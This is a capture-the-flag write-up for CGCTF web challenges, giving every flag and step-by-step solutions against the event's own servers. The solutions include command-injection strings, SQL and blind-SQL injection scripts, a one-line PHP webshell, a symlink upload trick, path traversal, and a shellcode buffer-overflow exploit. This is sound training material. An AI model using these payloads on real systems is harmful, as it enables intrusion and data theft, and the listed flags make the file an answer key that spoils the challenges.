# CGCTF Web Challenges

### Beginner

- web baby 1-5
    > Are you able to find the flags in this website?  
    > 10200/web_baby/
    1. `CGCTF{raw_HTTP_is_cool}`
    2. `CGCTF{HTTPheader##}`
    3. `CGCTF{yummyCookie<3}`
    4. `CGCTF{VanillaJS:D}`
    5. `CGCTF{display:none;}`

- api
    > APIs help developers alot.  
    > 10200/api/
    - `CGCTF{api_key_identifies_users}`

- weak
    > PHP is a weak typed scripting language.  
    > 10200/weak/
    - `CGCTF{PHP_is_different_from_C}`

- hash
    > Hash functions play important roles in cryptography.  
    > The flag is CGCTF{MD5(SHA1(SHA256("Web")))}.
    - `CGCTF{c8418811869de0bda328ed9dbed7e7b6}`

- http
    > Learn to use curl to see the details of HTTP.  
    > How does a browser deal with redirections?  
    > 10200/http/
    - `CGCTF{raw_headers_are_sexy}`

- cmd
    > Hackers are able to do a lot of bad things with command injection.  
    > 10200/cmd/
    - `CGCTF{cmd_inj_is_bad}`

- sql
    > SQL is not a specific language, but there are similar syntax between SQLs for different databases.  
    > 10200/sql/
    - `CGCTF{SQL_is_easy}`

- weak hash
    > This is not hash function's fault!  
    > 10200/weak_hash/
    - `CGCTF{weeeeeeeeeeeeeeeakhash}`

- sql injection
    > SQL Injection is just playing with SQL syntax and do bad things.  
    > 10200/sql_injection/
    - `CGCTF{sql_injjjjjjjjjection}`

- lfi
    > Vulnerable code may cause Local File Inclusion (LFI).  
    > 10200/lfi/
    - `CGCTF{lfilifflifliflifli}`

- php
    > PHP is not vulnerable, but the ignorant developers.  
    > 10200/php/
    - `CGCTF{eval;evil}`

- curl
    > Advanced curl!  
    > 10200/curl/
    - `CGCTF{curry+++}`

- dear
    > Dear images, I have a secret to tell you.  
    > 10200/dear/
    - `CGCTF{ohmydear}`

- megumi
    > Do you want a girlfriend?  
    > 10200/megumi/
    - `CGCTF{my_wife!}`

- otaku
    > Otaku's power.  
    > 10200/otaku/
    - `CGCTF{megumi_chan!!!!}`

- nurse
    > What if you don't want google bot to visit your secret pages?  
    > 10200/nurse/
    - `CGCTF{CoolHackerGuy}`

- ais3
    > PHP is good.  
    > 10200/ais3/
    - `CGCTF{do_you_know_ais3}`

- bypass
    > Is hash in PHP secure?  
    > 10200/bypass/
    - `CGCTF{bypass_alllll}`

- kiddie
    > Scripting kiddies with their own scripts!  
    > 10200/kiddie/
    - `CGCTF{B_a_scripting_kiddie!!}`

- shell
    > What will you upload?  
    > 10200/shell/
    - `CGCTF{everyone_becomes_bad_with_a_webshell}`

### Advanced

- nurse++ [200]
    > Find the other flag in the database.  
    > You can see the blood vessels through the skin.  
    > 10201/nurse/
    - `CGCTF{togodeeper}`

- wormhole [250]
    > The only way to get the flag, is creating a wormhole.  
    > 10202/wormhole/
    - `CGCTF{enjoy_the_wonderful_trip!}`

- echo [250]
    > How to be a shell master?  
    > 10203/echo/
    - `CGCTF{it_rains_cats_and_dogs}`

- CGSH Data Center 1-4 [150, 250, 300, 400]
    > S**t! Our data center is hacked!  
    > 10204/cgsh_data_center/
    1. `CGCTF{yet_another_poor_user}`
    2. `CGCTF{session_not_a_session}`
    3. `CGCTF{xdxdxdxd123}`
    4. `CGCTF{congratulations!!!!!!}`

- blank [450]
    > This is nothing but everything.  
    > 10201/blank/?$=0
    - `CGCTF{brightness_or_blindness}`

- gwn [150, 500]
    > Real hackers don't just play CTF.  
    > Hint 1: flag 1 is at `/root/flag1`.  
    > Hint 2: winner takes all.  
    > 10205/
    1. `CGCTF{IS_IT_TOO_EASY}`
    2. `CGCTF{15_1T_T00_D1FF1CULT??}`

# Solutions

## web baby

### 1
- View source; in a `<meta>`

### 2
- View response headers

### 3
- Cookie

### 4
- JavaScript; flag4 in console

### 5
- CSS; in styles.css


## api
```
/api/api.php?show_secret=1&api_key=kcc175b9c0f1b6a831c399e269772661
```

## weak
```
/weak/?input=00
```

## hash
- Use command or [CyberChef](https://gchq.github.io/CyberChef/)
```bash
echo -n Web | sha256sum
echo -n 2975104784a401e3880e2215550e9490eda7e67db5fc2b35e1a244acb092ced3 | sha1sum
echo -n 9e17ac1575889b4cb1b799454ac4da58b1870ffc | md5sum
# c8418811869de0bda328ed9dbed7e7b6
```

## http
just curl `/http/index.php`

## cmd
```
/cmd/?ip=;cat<flag.php
```

## sql
```
/sql/?select * from a_table
```

## weak hash
```
/weak_hash/?s[]=
```

## sql injection
```
/sql_injection/?name=' union select 'admin
```

## lfi
```
/lfi/?page=flag.php
```

## php
- eval(); `?input=$flag`


## curl
- curl, GET, POST, header, User-Agent
```
curl 'https://ctf.yuawn.idv.tw:10201/curl/?curl=curry' -d 'curl=curry' -H 'User-Agent: curry'
```


## dear
- Apache show directory /images


## megumi
- HTTP POST, parameter parsing, URL encoding, php strcmp

```
curl 'https://ctf.yuawn.idv.tw:10201/megumi/?love%23megumi' -d "love%3Dmegumi[]"
```

## otaku
- LFI, cookie, base64

1. GET `?page=index`
2. Set cookie: `my_wife=base64(megumi)=bWVndW1p`



## nurse
- SQL Injection, robots.txt

1. /robots.txt
2. _login.php
3. username: `' OR 1 --+`


## bypass
1. md5, `0e`, php
2. `a2[]=1&b2[]=2`

## ais3
- `0e`, PHP weak type


## kiddie

- scripting language, base64, http request, cookie


``` bash
flag=
url=https://ctf.yuawn.idv.tw:10200/kiddie/

for i in `seq 0 599`; do
    text=`curl -s $url -H "Cookie: count=$i"`
    char=${text:0:1}
    flag=$flag$char
    echo -n $char
done

for i in `seq 10`; do
    flag=`echo $flag | base64 --decode`
    echo -n ' | '$flag
done
```

## shell
- upload a tiny webshell
```php
<?php system($_GET['s']);

```
- use js console to submit
```
a.submit()
```

## nurse++
- SQL Injection

```
username=' union select 1,2,3 --
username=' union select 1,2,name from sqlite_master limit 0,1 --
username=' union select *,'admin',2 from secret limit 0,1 --
```



## wormhole
- Apache configuration `AllowSymLinks`

1. `ln -s / root`
2. `zip --symlinks files.zip root`
3. Upload it, go to root/another_universe/../flag



## echo
- Command injection

``` shell
# ?word=-n%26%26cat%09`find%09-name%09*flag*`
curl 'https://ctf.yuawn.idv.tw:10203/echo/?word=-n%26%26cat%09`find%09s*`' > cat_flag
chmod +x cat_flag
./cat_flag
```



## CGSH Data Center

### 1
- [md5 decrypter](https://hashkiller.co.uk/md5-decrypter.aspx), erda's md5 hash


### 2
- PHP serialization, cookie, base64


### 3
- SQL injection on cookie

1. Login as any user
2. Get PHPSESSID and USERINFO from cookie
3. Decode USERINFO and inject id as `0 union select password, 2, 3 from users where id=1`, change the string length as well.
4. Base64 encode the php serial and send it back with PHPSESSID in cookie (you can use `curl ... | grep 'id='`)


### 4
- SQL injection on cookie


```python
#!/usr/bin/env python3

import base64, requests, readline, code, re, warnings

warnings.filterwarnings('ignore')

url = 'http://localhost:10204/cgsh_data_center/account.php'

# Login and get session id
r = requests.post(url, data={'username': 'erda', 'password': '2017bad'}, verify=False)

assert r.text.find('Hello') != -1

session_id = r.cookies.get('PHPSESSID')
print('PHPSESSID:', session_id)

def userinfo(userid):
    serial = 'a:2:{s:2:"id";s:%s:"%s";s:8:"username";s:0:"";}'
    serial = serial % (len(userid), userid)
    return base64.b64encode(serial.encode()).decode()

def query(q):
    global session_id, url
    cookies = {
        'PHPSESSID': session_id,
        'USERINFO': userinfo(q)
        }
    return requests.get(url, cookies=cookies, verify=False).text

query('0 union select 1,2,3')

def ideq(q):
    regex = re.compile('\(id=(.+)\)')
    r = regex.search(query(q))
    try:
        return r.groups()[0]
    except:
        return None

# admin password md5 hash
result = ideq('0 union select password,2,3 from users where id=1')
print('admin\'s password md5 hash:', result)

# get database name
result = [ideq('''0 union 
select distinct table_schema,2,3
from information_schema.tables 
limit 1 offset %d''' % i) for i in range(5)]
print('databases:', result)

# get table names
result = [ideq('''0 union
select table_name,2,3
from information_schema.tables
where table_schema = 'exampleDB'
limit 1 offset %d''' % i) for i in range(10)]
print('tables in exampleDB:', result)

# get flag4
result = ideq('0 union select *,2,3 from flag4_is_here')
print('flag4:', result)

```

## blank

- blind sql injection


``` python
#!/usr/bin/env python3

from requests import get
from urllib.parse import quote_plus
from sys import stdout

import warnings
warnings.filterwarnings('ignore')

chars = "abcdefghijklmnopqrstuvwxyz"
chars += chars.upper()
chars += " _{}\"!@#$%^&*()[];:.,/?><\|"

def blank(q):
    url = "http://localhost:10201/blank/?$={}"
    return get(url.format(quote_plus(q)), verify=False).text

def guess(table, column, i, char):
    query = "' WHERE 0 UNION SELECT 1 FROM {table} "
    query += "WHERE substr({column}, {i}, 1) = '{char}"
    q = query.format(column=column, table=table, i=i, char=char)
    return blank(q) == "1"

def dump(table, column):
    i = 1
    result = ""
    while True:
        found = False
        for c in chars:
            stdout.write("\r%s%s" % (result, c))
            stdout.flush()
            if guess(table, column, i, c):
                result += c
                found = True
                break
        i += 1
        if not found:
            print("\r%s " % result)
            break

dump('sqlite_master', 'name')
dump('sqlite_master', 'sql')
dump('shiro', 'white')

```

## gwn

### 1
- GET: `/../../root/flag1`
- Maybe you shoud use `nc` instead of `curl` and browser

### 2
- Dump .git (GitTools)
- And you can get the source code
- Overflow return address of `read_req_path`
- Write shellcode to inject on BSS section
- Use `sys_dup2` to rewrite `stdout` and `stdin` to the socket file descriptor

```python
from pwn import *

r = remote("localhost", 10205)
e = ELF('./server.out')

# bss addresses
bss_addr = e.bss()
req_path_addr = bss_addr + 144 + 256
sockfd_addr = bss_addr + 144 + 256 + 128 + 8 + 8

# shellcode
s = """
mov rsi, 2
mov rdi, [%d]
dup2:
mov rax, 33
syscall
dec rsi
jns dup2
""" % sockfd_addr
s += shellcraft.amd64.sh()

# payload
p = "GET /" + asm(s, arch='amd64')
p += (1000 - len(p) + 8) * 'p'  # padding
shellcode_addr = req_path_addr + 2
p += p64(shellcode_addr)        # return address

r.sendline(p)
r.interactive()
```
